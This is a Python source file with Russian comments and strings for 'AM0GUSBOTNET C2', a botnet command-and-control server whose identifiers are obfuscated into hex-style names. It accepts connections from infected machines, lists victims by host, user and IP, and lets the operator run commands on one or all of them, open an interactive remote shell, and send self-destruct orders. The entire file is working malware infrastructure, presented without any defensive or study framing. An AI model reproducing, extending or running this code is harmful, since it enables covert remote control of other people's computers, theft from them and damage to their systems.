# ========== КОНФИГУРАЦИЯ AM0GUSBOTNET C2 ==========
HOST = '0.0.0.0'
PORT = 4444
# ===================================================

import socket as _sk, threading as _th, json as _js, sys as _sys, os as _os
from datetime import datetime as _dt

class ___0x60:
    def __init__(self, _0x61='0.0.0.0', _0x62=4444):
        self.__0x63 = _0x61
        self.__0x64 = _0x62
        self.__0x65 = {}
        self.__0x66 = None
        self.__0x67 = True
        self.__0x68 = []
        self.__0x69 = 0
    
    def __0x6A(self):
        self.__0x66 = _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM)
        self.__0x66.setsockopt(_sk.SOL_SOCKET, _sk.SO_REUSEADDR, 1)
        self.__0x66.bind((self.__0x63, self.__0x64))
        self.__0x66.listen(100)
        print(f"[*] AM0GUSBOTNET C2 на {self.__0x63}:{self.__0x64}")
        print(f"[*] Ожидание...")
        _0x6B = _th.Thread(target=self.__0x6C)
        _0x6B.daemon = True
        _0x6B.start()
        self.__0x6D()
    
    def __0x6C(self):
        while self.__0x67:
            try:
                _0x6E, _0x6F = self.__0x66.accept()
                _0x70 = _th.Thread(target=self.__0x71, args=(_0x6E, _0x6F))
                _0x70.daemon = True
                _0x70.start()
            except:
                break
    
    def __0x71(self, _0x72, _0x73):
        _0x74 = None
        try:
            _0x75 = _0x72.recv(4096)
            if not _0x75:
                return
            _0x76 = _js.loads(_0x75.decode())
            _0x74 = _0x76['id']
            self.__0x65[_0x74] = {
                'socket': _0x72,
                'info': _0x76,
                'addr': _0x73,
                'last_seen': _dt.now()
            }
            print(f"[+] {_0x76['host']}\\{_0x76['user']} ({_0x74}) из {_0x73[0]}")
            print(f"[i] Всего: {len(self.__0x65)}")
            while True:
                try:
                    _0x72.settimeout(60)
                    _0x77 = _0x72.recv(1)
                    if not _0x77:
                        break
                except _sk.timeout:
                    continue
                except:
                    break
        except Exception as _0x78:
            if _0x74:
                print(f"[-] Ошибка с {_0x74}: {_0x78}")
        if _0x74 and _0x74 in self.__0x65:
            del self.__0x65[_0x74]
            print(f"[-] Отключен: {_0x74}")
            print(f"[i] Осталось: {len(self.__0x65)}")
    
    def __0x6D(self):
        _0x79 = None
        while True:
            try:
                if _0x79 and _0x79 in self.__0x65:
                    _0x7A = self.__0x65[_0x79]['info']
                    _0x7B = f"\nAM0GUS-PRIME [{_0x7A['host']}\\{_0x7A['user']}]> "
                else:
                    _0x7B = "\nAM0GUS-PRIME> "
                try:
                    _0x7C = input(_0x7B).strip()
                except EOFError:
                    print("\n[*] Завершение...")
                    break
                if not _0x7C:
                    continue
                if _0x7C not in self.__0x68:
                    self.__0x68.append(_0x7C)
                self.__0x69 = len(self.__0x68)
                _0x7D = _0x7C.split()
                _0x7E = _0x7D[0].lower()
                if _0x7E == 'help':
                    print("\n[Команды]:")
                    print("-" * 50)
                    for _0x7F, _0x80 in {
                        'help': 'Показать команды',
                        'list': 'Список клиентов',
                        'select [id]': 'Выбрать клиента',
                        'cmd [command]': 'Выполнить команду',
                        'destroy': 'Самоуничтожение клиента',
                        'mass_destroy': 'Массовое уничтожение',
                        'broadcast [command]': 'Команда всем',
                        'shell': 'Интерактивная сессия',
                        'quit': 'Выход'
                    }.items():
                        print(f"  {_0x7F:25} - {_0x80}")
                    print("-" * 50)
                elif _0x7E == 'list':
                    self.__0x81()
                elif _0x7E == 'select':
                    if len(_0x7D) > 1:
                        _0x82 = _0x7D[1]
                        if _0x82 in self.__0x65:
                            _0x79 = _0x82
                            _0x83 = self.__0x65[_0x82]['info']
                            print(f"[+] Выбран: {_0x83['host']}\\{_0x83['user']} ({_0x82})")
                        else:
                            print("[-] Не найден.")
                    else:
                        print("[!] Укажите ID.")
                elif _0x7E == 'cmd' and _0x79:
                    if len(_0x7D) > 1:
                        _0x84 = ' '.join(_0x7D[1:])
                        self.__0x85(_0x79, {'type': 'cmd', 'command': _0x84})
                    else:
                        print("[!] Укажите команду")
                elif _0x7E == 'shell' and _0x79:
                    self.__0x86(_0x79)
                elif _0x7E == 'destroy' and _0x79:
                    _0x87 = input("[?] Подтвердите (y/N): ")
                    if _0x87.lower() == 'y':
                        self.__0x85(_0x79, {'type': 'self_destruct'})
                        print("[+] Отправлена команда уничтожения")
                        _0x79 = None
                elif _0x7E == 'mass_destroy':
                    _0x88 = input("[?] МАССОВОЕ уничтожение ВСЕХ? (y/N): ")
                    if _0x88.lower() == 'y':
                        _0x89 = len(self.__0x65)
                        for _0x8A in list(self.__0x65.keys()):
                            self.__0x85(_0x8A, {'type': 'mass_destruct'})
                        print(f"[+] Отправлено {_0x89} клиентам")
                elif _0x7E == 'broadcast':
                    if len(_0x7D) > 1:
                        _0x8B = ' '.join(_0x7D[1:])
                        for _0x8C in self.__0x65:
                            self.__0x85(_0x8C, {'type': 'cmd', 'command': _0x8B})
                        print(f"[+] Отправлено {len(self.__0x65)} клиентам")
                elif _0x7E == 'quit':
                    print("[*] Завершение...")
                    self.__0x67 = False
                    self.__0x66.close()
                    _os._exit(0)
                else:
                    if not _0x79 and _0x7E in ['cmd', 'shell', 'destroy']:
                        print("[-] Сначала выберите клиента 'select [id]'")
                    else:
                        print("[-] Неизвестная команда.")
            except KeyboardInterrupt:
                print("\n[*] Завершение...")
                self.__0x67 = False
                self.__0x66.close()
                break
            except Exception as _0x8D:
                print(f"[-] Ошибка: {_0x8D}")
    
    def __0x81(self):
        print("\n[Клиенты]:")
        print("=" * 70)
        print(f"{'ID':12} {'Хост':15} {'Пользователь':12} {'Версия':8} {'IP':15}")
        print("-" * 70)
        if not self.__0x65:
            print("  Нет клиентов")
        else:
            for _0x8E, (_0x8F, _0x90) in enumerate(self.__0x65.items(), 1):
                print(f"{_0x8F:12} {_0x90['info']['host']:15} {_0x90['info']['user']:12} "
                      f"{_0x90['info']['version']:8} {_0x90['addr'][0]:15}")
        print("=" * 70)
        print(f"[i] Всего: {len(self.__0x65)}")
    
    def __0x85(self, _0x91, _0x92):
        try:
            if _0x91 not in self.__0x65:
                print(f"[-] Клиент {_0x91} не найден")
                return
            _0x93 = self.__0x65[_0x91]['socket']
            _0x93.send(_js.dumps(_0x92).encode())
            if _0x92.get('type') == 'cmd':
                _0x93.settimeout(30)
                try:
                    _0x94 = _0x93.recv(65536)
                    if _0x94:
                        _0x95 = _js.loads(_0x94.decode())
                        print(f"\n[Результат на {self.__0x65[_0x91]['info']['host']}]:")
                        print("-" * 60)
                        print(_0x95.get('output', 'Нет вывода'))
                        print("-" * 60)
                except _sk.timeout:
                    print("[-] Таймаут (30 сек)")
        except Exception as _0x96:
            print(f"[-] Ошибка отправки {_0x91}: {_0x96}")
            if _0x91 in self.__0x65:
                del self.__0x65[_0x91]
    
    def __0x86(self, _0x97):
        if _0x97 not in self.__0x65:
            print("[-] Клиент не найден")
            return
        print(f"\n[Сессия с {self.__0x65[_0x97]['info']['host']}]")
        print("[*] Введите 'exit' для выхода")
        print("-" * 50)
        while True:
            try:
                _0x98 = input("CMD> ").strip()
                if _0x98.lower() == 'exit':
                    break
                if not _0x98:
                    continue
                self.__0x85(_0x97, {'type': 'cmd', 'command': _0x98})
            except KeyboardInterrupt:
                print("\n[*] Выход...")
                break
            except Exception as _0x99:
                print(f"[-] Ошибка: {_0x99}")
                break

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════╗
║                 AM0GUSBOTNET C2 Server               ║
║                  Без ограничений.                    ║
╚══════════════════════════════════════════════════════╝
    """)
    _0x9A = ___0x60(HOST, PORT)
    _0x9A.__0x6A()
